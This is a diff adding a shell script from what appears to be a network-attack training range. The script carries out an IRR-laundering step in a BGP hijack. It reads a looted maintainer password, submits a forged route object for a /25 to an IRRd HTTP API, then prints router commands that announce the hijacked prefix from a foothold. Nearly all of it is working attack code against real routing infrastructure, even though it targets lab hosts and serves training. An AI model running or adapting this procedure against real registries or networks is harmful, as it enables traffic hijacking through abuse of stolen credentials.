@@ -1,0 +1,52 @@
+#!/bin/sh
+# launder - the legitimacy-subversion arming step, performed by the player.
+#
+# Register a clean-looking IRR route object for the hijack prefix into FMDA's IRR,
+# using the maintainer password found on this box (/loot/maint-fmda, planted as the
+# abstracted compromised credential). This is a real network submission to IRRd's
+# HTTP submit API over the regpub segment, not a ctl knob. Once the object is
+# registered, FMDA's IRR authorises the /25, and when the transit rebuilds its
+# bgpq4 prefix-list it will permit the announcement.
+set -e
+
+IRR_API="http://fmda-irr.lab:8080/v1/submit/"
+PW_FILE="/loot/maint-fmda"
+PREFIX="203.0.113.0/25"
+ORIGIN="AS65020"
+
+if [ ! -f "$PW_FILE" ]; then
+    echo "launder: no maintainer credential on this box ($PW_FILE absent)."
+    echo "         this is the wrong foothold for that move, or the scenario is not armed."
+    exit 1
+fi
+PW=$(cat "$PW_FILE")
+
+OBJ="route: $PREFIX\norigin: $ORIGIN\ndescr: customer route\nmnt-by: MAINT-FMDA\nsource: FMDA\n"
+echo "launder: submitting route $PREFIX origin $ORIGIN to FMDA's IRR ($IRR_API) ..."
+RESP=$(curl -s -m10 -X POST "$IRR_API" -H "Content-Type: application/json" \
+  -d "{\"objects\":[{\"object_text\":\"$OBJ\"}],\"passwords\":[\"$PW\"]}")
+
+if echo "$RESP" | grep -q '"successful_create":1\|"successful_modify":1'; then
+    echo "launder: registered. FMDA's IRR now carries $PREFIX origin $ORIGIN."
+else
+    echo "launder: submission did not take. IRRd said:"
+    echo "$RESP"
+    exit 1
+fi
+
+cat <<MSG
+
+Next: the object is registered, but the transit still filters the /25 until its
+prefix-list is rebuilt from the registry (the operator's automation does this on a
+cycle; give it a moment). Then pivot to the foothold and announce it:
+
+    foothold
+    # in the foothold's vtysh (the discard static puts the prefix in the RIB so
+    # the network statement will originate it):
+    #   configure terminal
+    #   ip route $PREFIX Null0
+    #   router bgp 65020
+    #   address-family ipv4 unicast
+    #   network $PREFIX
+    #   end
+MSG
